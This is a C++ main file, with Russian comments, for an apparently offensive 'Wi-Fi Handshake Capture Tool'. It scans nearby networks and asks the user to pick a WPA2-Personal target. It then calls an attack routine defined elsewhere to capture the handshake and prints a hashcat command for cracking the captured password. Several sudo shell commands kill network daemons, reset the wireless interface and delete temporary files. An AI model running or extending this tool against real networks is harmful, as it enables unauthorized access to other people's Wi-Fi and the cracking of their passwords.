#include "scanner.hpp"
#include "attacker.hpp"
#include "interface.hpp"
#include <thread>
#include <iostream>
#include <cstdlib>

void restore_connection() {
    std::cout << "\n[*] Restoring network connection..." << std::endl;
    
    // Убиваем все процессы
    system("sudo pkill -f wpa_supplicant 2>/dev/null");
    system("sudo pkill -f dhcpcd 2>/dev/null");
    system("sudo pkill -f wpa_cli 2>/dev/null");
    system("sudo pkill -f dnsmasq 2>/dev/null");
    
    // Полный сброс интерфейса
    system("sudo ip link set wlp0s20f3 down 2>/dev/null");
    system("sudo iw dev wlp0s20f3 set type managed 2>/dev/null");
    system("sudo ip link set wlp0s20f3 up 2>/dev/null");
    
    // Очистка временных файлов
    system("sudo rm -f /tmp/wpa_ctrl_* 2>/dev/null");
    
    // Перезапуск NetworkManager
    system("sudo systemctl restart NetworkManager 2>/dev/null");
    
    std::this_thread::sleep_for(std::chrono::seconds(5));
    
    // Проверка и принудительное сканирование
    system("sudo nmcli device wifi rescan 2>/dev/null");
    
    std::cout << "[*] Network restored. You may need to reconnect to Wi-Fi." << std::endl;
}

int main() {
    std::cout << "=== Wi-Fi Handshake Capture Tool ===\n";
    
    // Автоматически определяем интерфейс
    std::string interface = select_interface();
    if (interface.empty()) {
        std::cerr << "[-] No usable wireless interface found. Exiting.\n";
        return 1;
    }
    
    std::cout << "[*] Using interface: " << interface << "\n";
    
    // Сохраняем интерфейс в файл для других функций (или передаём глобально)
    // Пока просто сохраним во временный файл
    FILE* f = fopen("interface.conf", "w");
    if (f) {
        fprintf(f, "INTERFACE=%s\n", interface.c_str());
        fclose(f);
    }
    
    std::cout << "[*] Scanning for networks...\n";
    
    auto networks = scan_networks();
    
    if (networks.empty()) {
        std::cerr << "[-] No networks found. Make sure Wi-Fi is enabled.\n";
        return 1;
    }
    
    print_networks(networks);
    
    int choice;
    std::cout << "\nSelect a target (1-" << networks.size() << "): ";
    std::cin >> choice;
    
    if (choice < 1 || choice > static_cast<int>(networks.size())) {
        std::cerr << "[-] Invalid choice.\n";
        return 1;
    }
    
    const auto& target = networks[choice - 1];
    save_target(target, "target.conf");
    
    if (!target.is_wpa2_personal()) {
        std::cout << "\n[-] This network is not WPA2-Personal. Exiting.\n";
        return 1;
    }
    
    std::cout << "\n[*] Ready to attack " << target.ssid << std::endl;
    std::cout << "[*] Using interface: " << interface << std::endl;
    std::cout << "[!] Your internet connection will be temporarily interrupted!\n";
    std::cout << "[!] Press Enter to continue...";
    std::cin.ignore();
    std::cin.get();
    
    // Для 2.4 ГГц сетей принудительно переключаем диапазон до атаки
    if (target.channel <= 14) {
        std::cout << "[*] Preparing for 2.4 GHz attack..." << std::endl;
        system("sudo pkill -f wpa_supplicant 2>/dev/null");
        system("sudo ip link set wlp0s20f3 down 2>/dev/null");
        system("sudo iw dev wlp0s20f3 set type managed 2>/dev/null");
        system("sudo ip link set wlp0s20f3 up 2>/dev/null");
        std::this_thread::sleep_for(std::chrono::seconds(2));
    }

    bool result = attack_network(target);
    
    if (result) {
        std::cout << "\n[+] SUCCESS! Handshake captured.\n";
        std::cout << "[*] Next step: crack with hashcat -m 2500 capture.pcap wordlist.txt\n";
    } else {
        std::cout << "\n[-] FAILED: Could not capture handshake.\n";
        std::cout << "[*] Try again with a different target or wait for active clients.\n";
    }
    restore_connection(); 
    return 0;
}
